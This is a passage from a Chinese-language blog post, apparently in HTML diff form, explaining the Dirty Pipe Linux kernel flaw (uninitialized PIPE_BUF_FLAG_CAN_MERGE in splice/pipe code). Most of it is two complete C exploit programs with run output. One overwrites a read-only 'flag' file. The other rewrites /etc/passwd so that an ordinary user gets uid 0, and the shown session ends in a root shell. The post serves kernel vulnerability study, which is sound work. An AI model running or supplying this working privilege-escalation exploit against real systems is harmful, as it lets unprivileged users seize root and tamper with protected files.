+<ul>
+<li>Linux 2.6.16 以前，<code>pipe_buf_operations</code> 结构有一个单独的 flag 叫做 <code>can_merge</code>，下面这行 if 语句通过则允许在当前页面续写</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ops-&gt;can_merge &amp;&amp; offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Linux 2.6.16 起，为了支持 <code>splice</code> 调用，引入了 <code>page_cache_pipe_buf_ops</code>，它实际上是一个设置了 <code>can_merge=0</code> 的 <code>pipe_buf_operations</code>，用来指示这部分页不能被管道写入</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> <span class="title">page_cache_pipe_buf_ops</span> =</span> &#123;</span><br><span class="line">	.can_merge = <span class="number">0</span>,</span><br><span class="line">	.<span class="built_in">map</span> = generic_pipe_buf_map,</span><br><span class="line">	.unmap = generic_pipe_buf_unmap,</span><br><span class="line">	.confirm = page_cache_pipe_buf_confirm,</span><br><span class="line">	.release = page_cache_pipe_buf_release,</span><br><span class="line">	.steal = page_cache_pipe_buf_steal,</span><br><span class="line">	.get = generic_pipe_buf_get,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Linux 5.0 中，由于只有一种管道缓冲区类型可以追加新数据，对 <code>can_merge</code> 的检查被修改为只检查类型是否是 <code>anon_pipe_buf_ops</code>（这就是那个唯一可追加内容的类型）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pipe_buf_can_merge(buf) &amp;&amp; offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">pipe_buf_can_merge</span><span class="params">(struct pipe_buffer *buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> buf-&gt;ops == &amp;anon_pipe_buf_ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Linux 5.8 中又将 <code>pipe_buf_operations</code> 类型的比较修改为 <code>pipe_buffer</code>的一个 flag：<code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
+<p>Linux 4.9 添加了两个新函数 <code>copy_page_to_iter_pipe</code> 和 <code>push_pipe</code> ，它们分配了新的管道缓冲区，但并没有初始化 flag（当时 flag 的作用并不大）</p>
+<p>Linux 5.8 对 flag 有所运用，没有初始化 flag，意味着之前遗留下来的 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位不会被 <code>splice</code> 系统调用清空，这可能会影响后续某些函数的执行流程</p>
+<p>漏洞利用的思路为：</p>
+<ul>
+<li>创建管道</li>
+<li>用任意数据填充管道（为整个缓冲区环结构设置 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 标记）</li>
+<li>清空管道（保留 <code>pipe_inode_info</code> 环中每一个缓冲区的 flag ）</li>
+<li>使用 <code>splice</code> 将目标文件（以只读方式打开）中的数据从目标偏移之前的位置放入到管道中</li>
+<li>将任意数据写入管道，此数据将覆盖缓存的文件页面，而不是创建新的匿名缓冲区 </li>
+</ul>
+<p>伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pipe(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完全填充管道,每个pipe_buffer现在将拥PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line"><span class="keyword">for</span> (r = pipe_size ; r &gt; <span class="number">0</span> ; )&#123; </span><br><span class="line">    n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">    write(p[<span class="number">1</span>], buffer, n);   </span><br><span class="line">    r -= n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 排空管道,释放所有pipe_buffer实例(但是保留标志初始化) */</span></span><br><span class="line"><span class="keyword">for</span> (r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">    n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">    read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">    r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;target&quot;</span>, O_RDONLY); </span><br><span class="line">--offset;</span><br><span class="line">splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">/* 将指定偏移量之前的一个字节拼接到管道,这将添加对页面缓存的引用,但PIPE_BUF_FLAG_CAN_MERGE的状态依然有效 */</span></span><br><span class="line"></span><br><span class="line">write(p[<span class="number">1</span>], data, data_size); <span class="comment">/* 不会创建新的pipe_buffer,而是会写入页面缓存 */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用 <code>splice</code> 函数可以通过“零拷贝”的形式将文件发送到 pipe（代码层面的零拷贝是直接将文件缓存页 page cache 作为 pipe 的缓存页使用）</li>
+<li>但这里引入了一个变量未初始化漏洞，导致文件缓存页会在后续 pipe 通道中被当成普通 pipe 缓存页而被“续写”进而被篡改</li>
+<li>然而，在这种情况下，因为没有其他可写权限的程序进行 write 操作，所以内核并不会将这个缓存页判定为“脏页”，短时间内(到下次重启之类的)不会刷新到磁盘</li>
+<li>在这段时间内所有访问该文件的场景都将使用被篡改的文件缓存页，也就达成了一个“短时间内对任意可读文件任意写”的操作</li>
+</ul>
+<p><strong>Dirty Pipe 漏洞复现</strong></p>
+<p>1.修改服务器上 flag 文件的值：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">loff_t</span> offset = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;lag&#123;pipeeee&#125;&quot;</span>; </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line">        <span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">                perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;st.st_size:0x%lx\n&quot;</span>,st.st_size);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">        prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">        --offset;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>结果如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">/ $ ./exp</span><br><span class="line">st.st_size:0xe</span><br><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;pipeeee&#125;</span><br></pre></td></tr></table></figure>
+<p>2.修改 <code>/etc/passwd</code> 中用户的 uid 和组 id 来实现提权：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">                <span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">                read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">                r -= n;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">loff_t</span> offset = <span class="number">30</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;test:x:0:0:,,,,,,,,,,,,,,,:/root:/bin/sh&quot;</span>; </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line">        <span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">                perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;st.st_size:0x%lx\n&quot;</span>,st.st_size);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">        prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">        --offset;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>因为 <code>su</code> 命令需要 root 权限，所以在 root 用户中进行测试</li>
+<li>结果如下：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /etc/passwd </span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/sh</span><br><span class="line">test:x:<span class="number">1000</span>:<span class="number">1000</span>:note:/home/test:/bin/sh</span><br><span class="line">/ # ./<span class="built_in">exp</span></span><br><span class="line">st.st_size:<span class="number">0x47</span></span><br><span class="line">/ <span class="meta"># cat /etc/passwd </span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/sh</span><br><span class="line">test:x:<span class="number">0</span>:<span class="number">0</span>:,,,,,,,,,,,,,,,:/root:/bin/sh</span><br><span class="line">/ <span class="meta"># su test</span></span><br><span class="line">/ <span class="meta"># whoami</span></span><br><span class="line">root</span><br><span class="line">/ <span class="meta"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span> groups=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>切换到 test 用户以后，还是显示 root 权限</li>
+</ul>
+<p>参考：</p>
+<ul>
